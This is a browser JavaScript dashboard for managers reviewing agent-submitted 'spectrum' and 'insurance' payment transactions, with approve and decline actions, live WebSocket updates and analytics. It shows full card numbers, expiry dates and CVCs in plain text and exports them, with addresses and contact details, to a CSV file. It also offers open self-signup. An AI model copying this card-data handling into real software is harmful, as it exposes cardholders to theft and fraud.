const API_BASE_URL = "https://twhspec-dk49.onrender.com";
const WS_URL = "wss://twhspec-dk49.onrender.com/ws/manager";
 // use wss:// in production

let authToken = null;
let userId = null;
let activeSheet = "spectrum"; // spectrum or insurance for pending view
let spectrumData = [];
let insuranceData = [];
let ws = null;

// Analytics data
let allSpectrum = [];
let allInsurance = [];
let analyticsLoaded = false;
let analyticsChart = null;

// Helpers
function $(id) {
  return document.getElementById(id);
}

function setText(id, text) {
  const el = $(id);
  if (el) el.textContent = text;
}

function show(id) {
  const el = $(id);
  if (el) el.classList.remove("hidden");
}

function hide(id) {
  const el = $(id);
  if (el) el.classList.add("hidden");
}

function showError(id, message) {
  const el = $(id);
  if (!el) return;
  el.textContent = message;
  el.classList.remove("hidden");
}

function hideError(id) {
  const el = $(id);
  if (!el) return;
  el.textContent = "";
  el.classList.add("hidden");
}

// API calls
async function apiFetch(path, options = {}) {
  const url = API_BASE_URL.replace(/\/$/, "") + path;
  const headers = options.headers || {};
  if (authToken) {
    headers["Authorization"] = "Bearer " + authToken;
  }
  headers["Content-Type"] = "application/json";
  return fetch(url, { ...options, headers });
}

async function apiLogin(user, pass) {
  const resp = await apiFetch("/auth/login", {
    method: "POST",
    body: JSON.stringify({ user_id: user, password: pass }),
  });
  if (!resp.ok) {
    const data = await resp.json().catch(() => ({}));
    throw new Error(data.detail || "Login failed");
  }
  return resp.json();
}

async function apiSignup(user, pass) {
  const resp = await apiFetch("/auth/signup", {
    method: "POST",
    body: JSON.stringify({ user_id: user, password: pass }),
  });
  if (!resp.ok) {
    const data = await resp.json().catch(() => ({}));
    throw new Error(data.detail || "Signup failed");
  }
  return resp.json();
}

async function apiGetPending(sheet) {
  const resp = await apiFetch(`/transactions/pending?sheet=${sheet}`, {
    method: "GET",
  });
  if (!resp.ok) {
    const data = await resp.json().catch(() => ({}));
    throw new Error(data.detail || "Failed to load pending transactions");
  }
  return resp.json();
}

async function apiUpdateStatus(sheet, recordId, newStatus) {
  const resp = await apiFetch(`/transactions/${sheet}/${recordId}/status`, {
    method: "PATCH",
    body: JSON.stringify({ new_status: newStatus }),
  });
  if (!resp.ok) {
    const data = await resp.json().catch(() => ({}));
    throw new Error(data.detail || "Failed to update status");
  }
  return resp.json();
}

async function apiGetAll(sheet) {
  const resp = await apiFetch(
    `/transactions/all?sheet=${encodeURIComponent(sheet)}`,
    {
      method: "GET",
    }
  );
  if (!resp.ok) {
    const data = await resp.json().catch(() => ({}));
    throw new Error(data.detail || "Failed to load full data");
  }
  return resp.json();
}

async function apiGetNightTotal(sheet) {
  const params = new URLSearchParams();
  if (sheet) {
    params.set("sheet", sheet);
  }
  const path = `/transactions/night_total${
    params.toString() ? "?" + params.toString() : ""
  }`;
  const resp = await apiFetch(path, {
    method: "GET",
  });
  if (!resp.ok) {
    const data = await resp.json().catch(() => ({}));
    throw new Error(data.detail || "Failed to load night total");
  }
  return resp.json();
}

// WebSocket and sound
function playNewLeadSound() {
  const audio = $("new-lead-sound");
  if (!audio) return;
  try {
    audio.currentTime = 0;
    audio.play().catch(() => {
      // Browser might block autoplay until user interacts
    });
  } catch (e) {
    // Ignore
  }
}

function setupWebSocket() {
  if (ws) {
    ws.close();
    ws = null;
  }

  ws = new WebSocket(WS_URL);
  ws.onopen = function () {
    // Connected
  };
  ws.onmessage = function (evt) {
    try {
      const msg = JSON.parse(evt.data);
      if (msg.type === "status_update") {
        const { sheet, record_id } = msg;
        if (sheet === "spectrum") {
          spectrumData = spectrumData.filter(
            (item) => item.data.Record_ID !== record_id
          );
        } else if (sheet === "insurance") {
          insuranceData = insuranceData.filter(
            (item) => item.data.Record_ID !== record_id
          );
        }
        renderLeads();
      } else if (msg.type === "new_pending") {
        const { sheet, record } = msg;
        const wrapper = { data: record };
        if (sheet === "spectrum") {
          spectrumData.push(wrapper);
        } else if (sheet === "insurance") {
          insuranceData.push(wrapper);
        }
        renderLeads();
        playNewLeadSound();
      }
    } catch (e) {
      // ignore bad messages
    }
  };

  ws.onerror = function () {};
  ws.onclose = function () {};
}

// Render lead blocks (styled, collapsible cards)
function renderLeads() {
  const container = $("leads-container");
  if (!container) return;

  container.innerHTML = "";

  const currentData = activeSheet === "spectrum" ? spectrumData : insuranceData;

  if (!currentData || currentData.length === 0) {
    show("dashboard-info");
    const info = $("dashboard-info");
    if (info) info.textContent = "No pending transactions.";
    return;
  } else {
    hide("dashboard-info");
  }

  currentData.forEach((item, index) => {
    const d = item.data || {};
    const recordId = d.Record_ID || "row_" + index;

    const cardHolder = String(d["Card Holder Name"] || "").trim();
    const cardNumber = d["Card Number"] || "";
    const expiry = d["Expiry Date"] || "";
    const charge = d["Charge"] || "";
    const address = d["Address"] || "";
    const cvc = d["CVC"] != null ? String(d["CVC"]) : "";
    const llc = d["LLC"] || "";
    const provider = d["Provider"] || "";
    const agentName = d["Agent Name"] || "";

    const parts = cardHolder.split(/\s+/).filter(Boolean);
    const firstName = parts.length > 0 ? parts[0] : "";
    const lastName = parts.length > 1 ? parts.slice(1).join(" ") : "";

    const card = document.createElement("div");
    card.className = "lead-card";
    card.classList.remove("collapsed");

    const status = d["Status"] || "Pending";
    if (status === "Charged") {
      card.classList.add("status-charged");
    } else if (status === "Charge Back") {
      card.classList.add("status-chargeback");
    } else if (status === "Declined") {
      card.classList.add("status-declined");
    } else {
      card.classList.add("status-pending");
    }

    // Header
    const header = document.createElement("div");
    header.className = "lead-card-header";

    const toggleIcon = document.createElement("span");
    toggleIcon.className = "lead-card-toggle-icon";
    toggleIcon.textContent = "▾";

    const headerText = document.createElement("div");

    const title = document.createElement("div");
    title.className = "lead-card-title";
    const titleCharge = charge || "N/A";
    const titleLlc = llc || "N/A";
    title.textContent = `${agentName || "Unknown Agent"} — ${titleCharge} (${titleLlc})`;

    const subtitle = document.createElement("div");
    subtitle.className = "lead-card-subtitle";
    const providerText = provider ? " · " + provider : "";
    const recordText = recordId ? " · Record: " + recordId : "";
    subtitle.textContent =
      "Card: " + (cardNumber || "N/A") + providerText + recordText;

    headerText.appendChild(title);
    headerText.appendChild(subtitle);

    header.appendChild(toggleIcon);
    header.appendChild(headerText);

    // Make header toggle collapse/expand
    header.addEventListener("click", () => {
      card.classList.toggle("collapsed");
    });

    // Body
    const body = document.createElement("div");
    body.className = "lead-card-body";

    const grid = document.createElement("div");
    grid.className = "lead-card-grid";

    function addField(label, value) {
      const wrapper = document.createElement("div");

      const lbl = document.createElement("div");
      lbl.className = "lead-field-label";
      lbl.textContent = label;

      const val = document.createElement("div");
      val.className = "lead-field-value";
      val.textContent = value || "";

      wrapper.appendChild(lbl);
      wrapper.appendChild(val);
      grid.appendChild(wrapper);
    }

    addField("Card Number", cardNumber);
    addField("Expiry Date", expiry);
    addField("Charge", charge);
    addField("First Name", firstName);
    addField("Last Name", lastName);
    addField("Address", address);
    addField("CVC", cvc);
    addField("Card Holder Name", cardHolder);

    body.appendChild(grid);

    // Actions
    const actions = document.createElement("div");
    actions.className = "lead-card-actions";

    const btnApprove = document.createElement("button");
    btnApprove.className = "btn btn-small btn-success";
    btnApprove.textContent = "Approve";
    btnApprove.onclick = function () {
      handleStatusChange(activeSheet, recordId, "Charged");
    };

    const btnDecline = document.createElement("button");
    btnDecline.className = "btn btn-small btn-danger";
    btnDecline.textContent = "Decline";
    btnDecline.onclick = function () {
      handleStatusChange(activeSheet, recordId, "Declined");
    };

    actions.appendChild(btnApprove);
    actions.appendChild(btnDecline);

    card.appendChild(header);
    card.appendChild(body);
    card.appendChild(actions);

    container.appendChild(card);
  });
}

// Auth handlers
async function handleLoginSubmit(event) {
  event.preventDefault();
  hideError("login-error");
  const user = $("login-user") ? $("login-user").value.trim() : "";
  const pass = $("login-pass") ? $("login-pass").value.trim() : "";
  if (!user || !pass) {
    showError("login-error", "Please fill both fields.");
    return;
  }
  try {
    const data = await apiLogin(user, pass);
    authToken = data.access_token;
    userId = user;
    localStorage.setItem("token", authToken);
    localStorage.setItem("userId", userId);
    onAuthSuccess();
  } catch (err) {
    showError("login-error", err.message || "Login failed.");
  }
}

async function handleSignupSubmit(event) {
  event.preventDefault();
  hideError("signup-error");
  const user = $("signup-user") ? $("signup-user").value.trim() : "";
  const pass = $("signup-pass") ? $("signup-pass").value.trim() : "";
  const pass2 = $("signup-pass2") ? $("signup-pass2").value.trim() : "";
  if (!user || !pass || !pass2) {
    showError("signup-error", "Please fill all fields.");
    return;
  }
  if (pass !== pass2) {
    showError("signup-error", "Passwords do not match.");
    return;
  }
  try {
    const data = await apiSignup(user, pass);
    authToken = data.access_token;
    userId = user;
    localStorage.setItem("token", authToken);
    localStorage.setItem("userId", userId);
    onAuthSuccess();
  } catch (err) {
    showError("signup-error", err.message || "Signup failed.");
  }
}

function onAuthSuccess() {
  hide("auth-section");
  show("dashboard-section");
  const logoutBtn = $("logout-btn");
  if (logoutBtn) logoutBtn.classList.remove("hidden");
  setText("user-label", "Logged in as: " + (userId || ""));
  setupWebSocket();
  loadAllPending();
  loadNightTotal();
}

// Logout
function handleLogout() {
  authToken = null;
  userId = null;
  localStorage.removeItem("token");
  localStorage.removeItem("userId");
  if (ws) {
    ws.close();
    ws = null;
  }
  show("auth-section");
  hide("dashboard-section");
  const logoutBtn = $("logout-btn");
  if (logoutBtn) logoutBtn.classList.add("hidden");
  setText("user-label", "");
}

// Load pending
async function loadAllPending() {
  hideError("dashboard-error");
  show("dashboard-info");
  const info = $("dashboard-info");
  if (info) info.textContent = "Loading transactions...";
  try {
    const [spectrum, insurance] = await Promise.all([
      apiGetPending("spectrum"),
      apiGetPending("insurance"),
    ]);
    spectrumData = spectrum;
    insuranceData = insurance;
    if (info) {
      info.textContent = "";
      hide("dashboard-info");
    }
    renderLeads();
  } catch (err) {
    showError("dashboard-error", err.message || "Failed to load data.");
  }
}

// Status change
async function handleStatusChange(sheet, recordId, status) {
  hideError("dashboard-error");
  try {
    await apiUpdateStatus(sheet, recordId, status);
    if (sheet === "spectrum") {
      spectrumData = spectrumData.filter(
        (item) => item.data.Record_ID !== recordId
      );
    } else if (sheet === "insurance") {
      insuranceData = insuranceData.filter(
        (item) => item.data.Record_ID !== recordId
      );
    }
    renderLeads();
  } catch (err) {
    showError("dashboard-error", err.message || "Failed to update status.");
  }
}

// Top tabs: spectrum, insurance, analytics
function setActiveTab(tab) {
  const tabSpectrum = $("tab-spectrum");
  const tabInsurance = $("tab-insurance");
  const tabAnalytics = $("tab-analytics");

  if (tabSpectrum) {
    tabSpectrum.classList.toggle("tab-active", tab === "spectrum");
  }
  if (tabInsurance) {
    tabInsurance.classList.toggle("tab-active", tab === "insurance");
  }
  if (tabAnalytics) {
    tabAnalytics.classList.toggle("tab-active", tab === "analytics");
  }

  const leadsContainer = $("leads-container");
  const analyticsSection = $("analytics-section");

  if (tab === "analytics") {
    if (leadsContainer) leadsContainer.classList.add("hidden");
    if (analyticsSection) analyticsSection.classList.remove("hidden");
    loadAnalyticsDataIfNeeded();
  } else {
    activeSheet = tab;
    if (leadsContainer) leadsContainer.classList.remove("hidden");
    if (analyticsSection) analyticsSection.classList.add("hidden");
    renderLeads();
  }
}

// Night total badge
async function loadNightTotal() {
  const amountEl = $("night-badge-amount");
  const selectEl = $("night-sheet-select");
  if (!amountEl) return;

  const sheet = selectEl ? selectEl.value || null : null;

  try {
    const data = await apiGetNightTotal(sheet);
    const total = typeof data.total === "number" ? data.total : 0;
    const formatted = "$" + total.toFixed(2);
    amountEl.textContent = formatted;
  } catch (e) {
    amountEl.textContent = "$0.00";
  }
}

function initNightBadge() {
  const selectEl = $("night-sheet-select");
  if (selectEl) {
    selectEl.addEventListener("change", () => {
      loadNightTotal();
    });
  }
}

// Analytics helpers
function parseTimestamp(ts) {
  if (!ts) return null;
  const raw = String(ts).trim();
  const d = new Date(raw);
  if (!isNaN(d.getTime())) {
    return d;
  }
  return null;
}

function parseCharge(value) {
  if (value == null) return 0;
  const str = String(value).replace(/[^0-9.\-]+/g, "");
  const num = parseFloat(str);
  return isNaN(num) ? 0 : num;
}

function getAnalyticsBaseData() {
  const sheetSelect = $("analytics-sheet");
  const sheetValue = sheetSelect ? sheetSelect.value : "spectrum";
  let data = [];
  if (sheetValue === "spectrum") {
    data = allSpectrum.slice();
  } else if (sheetValue === "insurance") {
    data = allInsurance.slice();
  } else {
    data = allSpectrum.concat(allInsurance);
  }
  return data;
}

function collectAnalyticsFilters() {
  const agentSelect = $("analytics-agent");
  const statusSelect = $("analytics-status");
  const chartTypeSelect = $("analytics-chart-type");

  const fromDateInput = $("analytics-from-date");
  const fromTimeInput = $("analytics-from-time");
  const toDateInput = $("analytics-to-date");
  const toTimeInput = $("analytics-to-time");

  const agent = agentSelect ? agentSelect.value : "";
  const status = statusSelect ? statusSelect.value : "";
  const chartType = chartTypeSelect ? chartTypeSelect.value : "bar";

  let fromDate = null;
  let toDate = null;

  if (
    fromDateInput &&
    fromDateInput.value &&
    fromTimeInput &&
    fromTimeInput.value
  ) {
    fromDate = new Date(fromDateInput.value + "T" + fromTimeInput.value);
  }
  if (toDateInput && toDateInput.value && toTimeInput && toTimeInput.value) {
    toDate = new Date(toDateInput.value + "T" + toTimeInput.value);
  }

  return { agent, status, chartType, fromDate, toDate };
}

function filterAnalyticsData() {
  const baseData = getAnalyticsBaseData();
  const { agent, status, fromDate, toDate } = collectAnalyticsFilters();

  const filtered = [];
  for (const row of baseData) {
    const ts = parseTimestamp(row["Timestamp"]);
    if (!ts) continue;

    if (fromDate && ts < fromDate) continue;
    if (toDate && ts > toDate) continue;

    if (agent && row["Agent Name"] !== agent) continue;

    if (status && row["Status"] !== status) continue;

    filtered.push({
      ...row,
      _parsedTimestamp: ts,
      _chargeFloat: parseCharge(row["Charge"]),
    });
  }
  return filtered;
}

function updateAnalyticsMetrics(filteredRows, groupedByHour) {
  let totalCharge = 0;
  let totalTransactions = filteredRows.length;
  for (const row of filteredRows) {
    totalCharge += row._chargeFloat || 0;
  }

  const metricTotalCharge = $("metric-total-charge");
  const metricTotalTransactions = $("metric-total-transactions");
  const metricAvgPerHour = $("metric-avg-per-hour");
  const metricPeakTimestamp = $("metric-peak-timestamp");

  if (metricTotalCharge) {
    metricTotalCharge.textContent = "$" + totalCharge.toFixed(2);
  }
  if (metricTotalTransactions) {
    metricTotalTransactions.textContent = String(totalTransactions);
  }

  const hours = Object.keys(groupedByHour);
  if (hours.length === 0) {
    if (metricAvgPerHour) metricAvgPerHour.textContent = "$0.00";
    if (metricPeakTimestamp) metricPeakTimestamp.textContent = "N/A";
    return;
  }

  let sumPerHour = 0;
  let peakHour = null;
  let peakValue = -Infinity;

  hours.forEach((key) => {
    const value = groupedByHour[key];
    sumPerHour += value;
    if (value > peakValue) {
      peakValue = value;
      peakHour = new Date(parseInt(key, 10));
    }
  });

  const avgPerHour = sumPerHour / hours.length;

  if (metricAvgPerHour) {
    metricAvgPerHour.textContent = "$" + avgPerHour.toFixed(2);
  }
  if (metricPeakTimestamp) {
    metricPeakTimestamp.textContent = peakHour
      ? peakHour.toLocaleString()
      : "N/A";
  }
}

function renderAnalyticsChart() {
  const filtered = filterAnalyticsData();
  const { chartType } = collectAnalyticsFilters();
  const ctx = $("analytics-chart");
  if (!ctx) return;

  const grouped = {};
  const groupedStatus = {};

  filtered.forEach((row) => {
    const ts = row._parsedTimestamp;
    const charge = row._chargeFloat || 0;
    const status = row["Status"] || "Unknown";

    const hour = new Date(
      ts.getFullYear(),
      ts.getMonth(),
      ts.getDate(),
      ts.getHours(),
      0,
      0,
      0
    );
    const key = hour.getTime();

    if (!grouped[key]) grouped[key] = 0;
    grouped[key] += charge;

    if (!groupedStatus[key]) groupedStatus[key] = {};
    if (!groupedStatus[key][status]) groupedStatus[key][status] = 0;
    groupedStatus[key][status] += charge;
  });

  const sortedKeys = Object.keys(grouped)
    .map((k) => parseInt(k, 10))
    .sort((a, b) => a - b);

  const labels = sortedKeys.map((ms) => {
    const d = new Date(ms);
    return d.toLocaleString();
  });

  const values = sortedKeys.map((ms) => grouped[ms]);

  updateAnalyticsMetrics(filtered, grouped);

  if (analyticsChart) {
    analyticsChart.destroy();
    analyticsChart = null;
  }

  if (chartType === "stacked") {
    const allStatusesSet = new Set();
    sortedKeys.forEach((key) => {
      const bucket = groupedStatus[key] || {};
      Object.keys(bucket).forEach((status) => allStatusesSet.add(status));
    });
    const allStatuses = Array.from(allStatusesSet);

    const datasets = allStatuses.map((status) => {
      return {
        label: status,
        data: sortedKeys.map((key) => {
          const bucket = groupedStatus[key] || {};
          return bucket[status] || 0;
        }),
      };
    });

    analyticsChart = new Chart(ctx, {
      type: "bar",
      data: {
        labels,
        datasets,
      },
      options: {
        responsive: true,
        plugins: {
          legend: {
            labels: {
              color: "#e5e7eb",
            },
          },
        },
        scales: {
          x: {
            ticks: { color: "#9ca3af" },
            grid: { color: "rgba(55,65,81,0.4)" },
          },
          y: {
            ticks: { color: "#9ca3af" },
            grid: { color: "rgba(55,65,81,0.4)" },
          },
        },
      },
    });
  } else if (chartType === "line") {
    analyticsChart = new Chart(ctx, {
      type: "line",
      data: {
        labels,
        datasets: [
          {
            label: "Total Charge",
            data: values,
            fill: false,
          },
        ],
      },
      options: {
        responsive: true,
        plugins: {
          legend: {
            labels: {
              color: "#e5e7eb",
            },
          },
        },
        scales: {
          x: {
            ticks: { color: "#9ca3af" },
            grid: { color: "rgba(55,65,81,0.4)" },
          },
          y: {
            ticks: { color: "#9ca3af" },
            grid: { color: "rgba(55,65,81,0.4)" },
          },
        },
      },
    });
  } else {
    analyticsChart = new Chart(ctx, {
      type: "bar",
      data: {
        labels,
        datasets: [
          {
            label: "Total Charge",
            data: values,
          },
        ],
      },
      options: {
        responsive: true,
        plugins: {
          legend: {
            labels: {
              color: "#e5e7eb",
            },
          },
        },
        scales: {
          x: {
            ticks: { color: "#9ca3af" },
            grid: { color: "rgba(55,65,81,0.4)" },
          },
          y: {
            ticks: { color: "#9ca3af" },
            grid: { color: "rgba(55,65,81,0.4)" },
          },
        },
      },
    });
  }
}

function renderAnalyticsTable() {
  const head = $("analytics-table-head");
  const body = $("analytics-table-body");
  if (!head || !body) return;

  const filtered = filterAnalyticsData();
  const searchInput = $("analytics-search");
  const searchValue = searchInput ? searchInput.value.trim().toLowerCase() : "";

  let rows = filtered;

  if (searchValue) {
    rows = filtered.filter((row) => {
      return Object.values(row).some((val) =>
        String(val || "")
          .toLowerCase()
          .includes(searchValue)
      );
    });
  }

  head.innerHTML = "";
  body.innerHTML = "";

  if (rows.length === 0) {
    const tr = document.createElement("tr");
    const td = document.createElement("td");
    td.colSpan = 6;
    td.textContent = "No data for selected filters.";
    tr.appendChild(td);
    body.appendChild(tr);
    return;
  }

  const sample = rows[0];
  const headers = [
    "Record_ID",
    "Agent Name",
    "Name",
    "Charge",
    "Status",
    "Timestamp",
  ].filter((h) => h in sample);

  const trHead = document.createElement("tr");
  headers.forEach((h) => {
    const th = document.createElement("th");
    th.textContent = h;
    trHead.appendChild(th);
  });
  head.appendChild(trHead);

  rows.forEach((row) => {
    const tr = document.createElement("tr");
    headers.forEach((h) => {
      const td = document.createElement("td");
      if (h === "Status") {
        const span = document.createElement("span");
        span.className = "status-pill " + String(row[h] || "");
        span.textContent = String(row[h] || "");
        td.appendChild(span);
      } else {
        td.textContent = String(row[h] || "");
      }
      tr.appendChild(td);
    });
    body.appendChild(tr);
  });
}

function renderAnalyticsDuplicates() {
  const wrapper = $("analytics-duplicates-wrapper");
  const empty = $("analytics-duplicates-empty");
  const body = $("analytics-duplicates-body");
  if (!wrapper || !empty || !body) return;

  const baseData = getAnalyticsBaseData();
  const counts = {};
  baseData.forEach((row) => {
    const key = String(row["Record_ID"] || "").trim();
    if (!key) return;
    counts[key] = (counts[key] || 0) + 1;
  });

  const duplicates = Object.entries(counts)
    .filter(([, count]) => count > 1)
    .sort((a, b) => b[1] - a[1]);

  body.innerHTML = "";

  if (duplicates.length === 0) {
    empty.classList.remove("hidden");
    wrapper.classList.add("hidden");
    return;
  }

  empty.classList.add("hidden");
  wrapper.classList.remove("hidden");

  duplicates.forEach(([recordId, count]) => {
    const tr = document.createElement("tr");
    const tdId = document.createElement("td");
    const tdCount = document.createElement("td");

    tdId.textContent = recordId;
    tdCount.textContent = String(count);

    tr.appendChild(tdId);
    tr.appendChild(tdCount);
    body.appendChild(tr);
  });
}

function downloadAnalyticsCSV() {
  const filtered = filterAnalyticsData();
  const headers = [
    "Record_ID",
    "Agent Name",
    "Name",
    "Ph Number",
    "Address",
    "Email",
    "Card Holder Name",
    "Card Number",
    "Expiry Date",
    "CVC",
    "Charge",
    "LLC",
    "Provider",
    "Date of Charge",
    "Status",
    "Timestamp",
  ];

  let csv = "";
  csv += headers.join(",") + "\n";
  filtered.forEach((row) => {
    const line = headers
      .map((h) => {
        const val = row[h] != null ? String(row[h]) : "";
        const safe = '"' + val.replace(/"/g, '""') + '"';
        return safe;
      })
      .join(",");
    csv += line + "\n";
  });

  const blob = new Blob([csv], { type: "text/csv;charset=utf-8;" });
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = "transactions_analytics.csv";
  document.body.appendChild(a);
  a.click();
  document.body.removeChild(a);
  URL.revokeObjectURL(url);
}

function refreshAnalyticsUI() {
  renderAnalyticsChart();
  renderAnalyticsTable();
  renderAnalyticsDuplicates();
}

async function loadAnalyticsDataIfNeeded() {
  if (analyticsLoaded) {
    refreshAnalyticsUI();
    return;
  }

  try {
    const [spec, ins] = await Promise.all([
      apiGetAll("spectrum"),
      apiGetAll("insurance"),
    ]);
    allSpectrum = (spec || []).map((item) => item.data || {});
    allInsurance = (ins || []).map((item) => item.data || {});
    analyticsLoaded = true;
    initializeAnalyticsFilters();
    refreshAnalyticsUI();
  } catch (err) {
    showError(
      "dashboard-error",
      err.message || "Failed to load analytics data."
    );
  }
}

function initializeAnalyticsFilters() {
  const sheetSelect = $("analytics-sheet");
  const agentSelect = $("analytics-agent");

  const agentSet = new Set();
  allSpectrum.forEach((row) => {
    if (row["Agent Name"]) agentSet.add(String(row["Agent Name"]));
  });
  allInsurance.forEach((row) => {
    if (row["Agent Name"]) agentSet.add(String(row["Agent Name"]));
  });

  if (agentSelect) {
    agentSelect.innerHTML = "";
    const optAll = document.createElement("option");
    optAll.value = "";
    optAll.textContent = "All Agents";
    agentSelect.appendChild(optAll);

    Array.from(agentSet)
      .sort()
      .forEach((name) => {
        const opt = document.createElement("option");
        opt.value = name;
        opt.textContent = name;
        agentSelect.appendChild(opt);
      });
  }

  const allData = allSpectrum.concat(allInsurance).map((row) => {
    const ts = parseTimestamp(row["Timestamp"]);
    return ts;
  });
  const validDates = allData.filter((d) => d instanceof Date && !isNaN(d));
  if (validDates.length > 0) {
    let min = validDates[0];
    let max = validDates[0];
    validDates.forEach((d) => {
      if (d < min) min = d;
      if (d > max) max = d;
    });

    const fromDateInput = $("analytics-from-date");
    const fromTimeInput = $("analytics-from-time");
    const toDateInput = $("analytics-to-date");
    const toTimeInput = $("analytics-to-time");

    if (fromDateInput) {
      fromDateInput.value = min.toISOString().slice(0, 10);
    }
    if (fromTimeInput) {
      const hh = String(min.getHours()).padStart(2, "0");
      const mm = String(min.getMinutes()).padStart(2, "0");
      fromTimeInput.value = hh + ":" + mm;
    }
    if (toDateInput) {
      toDateInput.value = max.toISOString().slice(0, 10);
    }
    if (toTimeInput) {
      const hh = String(max.getHours()).padStart(2, "0");
      const mm = String(max.getMinutes()).padStart(2, "0");
      toTimeInput.value = hh + ":" + mm;
    }
  }

  if (sheetSelect) {
    sheetSelect.addEventListener("change", () => {
      refreshAnalyticsUI();
    });
  }

  const agentSel = $("analytics-agent");
  const statusSel = $("analytics-status");
  const chartSel = $("analytics-chart-type");
  const searchInput = $("analytics-search");
  const refreshBtn = $("analytics-refresh");
  const downloadBtn = $("analytics-download");

  if (agentSel) {
    agentSel.addEventListener("change", refreshAnalyticsUI);
  }
  if (statusSel) {
    statusSel.addEventListener("change", refreshAnalyticsUI);
  }
  if (chartSel) {
    chartSel.addEventListener("change", refreshAnalyticsUI);
  }
  if (searchInput) {
    searchInput.addEventListener("input", () => {
      renderAnalyticsTable();
    });
  }
  if (refreshBtn) {
    refreshBtn.addEventListener("click", () => {
      refreshAnalyticsUI();
    });
  }
  if (downloadBtn) {
    downloadBtn.addEventListener("click", () => {
      downloadAnalyticsCSV();
    });
  }
}

// Initial setup
function init() {
  setText("api-url", "API: " + API_BASE_URL);

  const savedToken = localStorage.getItem("token");
  const savedUser = localStorage.getItem("userId");

  initNightBadge();

  if (savedToken && savedUser) {
    authToken = savedToken;
    userId = savedUser;
    onAuthSuccess();
  } else {
    show("auth-section");
    hide("dashboard-section");
  }

  const tabLogin = $("tab-login");
  const tabSignup = $("tab-signup");
  const loginForm = $("login-form");
  const signupForm = $("signup-form");
  const tabSpectrum = $("tab-spectrum");
  const tabInsurance = $("tab-insurance");
  const tabAnalytics = $("tab-analytics");
  const logoutBtn = $("logout-btn");

  if (tabLogin && tabSignup && loginForm && signupForm) {
    tabLogin.addEventListener("click", function () {
      tabLogin.classList.add("tab-active");
      tabSignup.classList.remove("tab-active");
      loginForm.classList.remove("hidden");
      signupForm.classList.add("hidden");
    });
    tabSignup.addEventListener("click", function () {
      tabSignup.classList.add("tab-active");
      tabLogin.classList.remove("tab-active");
      signupForm.classList.remove("hidden");
      loginForm.classList.add("hidden");
    });

    loginForm.addEventListener("submit", handleLoginSubmit);
    signupForm.addEventListener("submit", handleSignupSubmit);
  }

  if (tabSpectrum) {
    tabSpectrum.addEventListener("click", function () {
      setActiveTab("spectrum");
    });
  }
  if (tabInsurance) {
    tabInsurance.addEventListener("click", function () {
      setActiveTab("insurance");
    });
  }
  if (tabAnalytics) {
    tabAnalytics.addEventListener("click", function () {
      setActiveTab("analytics");
    });
  }

  if (logoutBtn) {
    logoutBtn.addEventListener("click", handleLogout);
  }

  setActiveTab("spectrum");
}

document.addEventListener("DOMContentLoaded", init);


